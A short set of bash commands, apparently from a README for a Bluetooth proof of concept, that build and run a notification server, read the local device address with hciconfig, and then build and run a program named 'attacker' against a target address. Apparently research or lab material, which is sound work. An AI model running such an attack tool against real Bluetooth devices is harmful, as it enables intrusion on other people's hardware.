```bash
gcc -o notification_server notification_server.c -lbluetooth

./notification_server

#Get BD_ADDR.
hciconfig
```
```bash
gcc -o attacker attacker.c
./attacker XX:XX:XX:XX:XX:XX "<BD_ADDR>"
```